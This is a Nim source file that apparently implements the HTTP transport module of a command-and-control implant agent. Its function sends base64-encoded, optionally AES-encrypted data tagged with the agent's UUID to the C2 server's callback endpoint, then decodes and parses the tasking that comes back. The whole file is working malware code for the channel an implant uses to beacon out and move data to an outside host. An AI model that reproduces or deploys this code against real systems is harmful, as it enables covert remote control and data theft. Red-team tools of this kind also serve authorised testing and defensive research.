when defined(ENCRYPT_TRAFFIC):
  import ../crypto

import json
import puppy
import std/options
import ../structs
import ../config
import ../b64

template DBG(msg: string) =
  when defined(debug):
    echo msg


#[
  A generic init function - not requried for HTTP
]#
proc initialize*() =
  discard


#[
  This functions sends the data
  to the C2 Server and retrieves the returned data.
  It handles the base64 encoding and eventually the
  encryption
]#
proc sendAndRetrData*(data: JsonNode): Option[JsonNode]  =

  var remoteUrl = ""
  var uuid = ""

  remoteUrl = connection.remoteEndpoint & ":" & $connection.callbackPort & "/" & connection.postEndpoint
  #remoteUrl = connection.remoteEndpoint & "/" & connection.postEndpoint
  uuid = connection.uuid


  # When using AES encrypted traffic, encrypt the data
  # string to return the encrypted byte sequence
  # if NOT: only convert to seq as this is later used as seq and
  # not as string anymore var encData: seq[byte]
  var encData: seq[byte]

  when defined(ENCRYPT_TRAFFIC):
    encData = encrypt($data, connection.encryptionKey)
  else:
    encData = cast[seq[byte]]($data)


  # Build the POST Request that gets send to
  # the C2
  let req = Request(
    url: parseUrl(remoteUrl),
    headers: connection.httpHeaders,
    verb: "post",
    body: b64.encode(Base64Pad, cast[seq[byte]](uuid) & encData) # do the base64 encoding here "{uuid}{data}"
  )

  try:

    # Send the reuqest
    let response = fetch(req)

    # A non-200 status code means that something with
    # the request was wrong (Should not really happen)
    if response.code != 200:
      return none(JsonNode)

    # get the response body, decode the base64 and parse the uuid and json struct
    let respBody = b64.decode(Base64Pad, response.body)
    var respJson: string

    when defined(ENCRYPT_TRAFFIC):
      let encRespJson = respBody[36..len(respBody)-1]
      respJson = decrypt(encRespJson, connection.encryptionKey)
    else:
      respJson = cast[string](respBody)[36..len(respBody)-1]


    let asJson = parseJson(respJson)
    return some(asJson) # return the JsonNode

  except PuppyError:
    DBG("[-] Failed to send request to C2")
    return none(JsonNode)


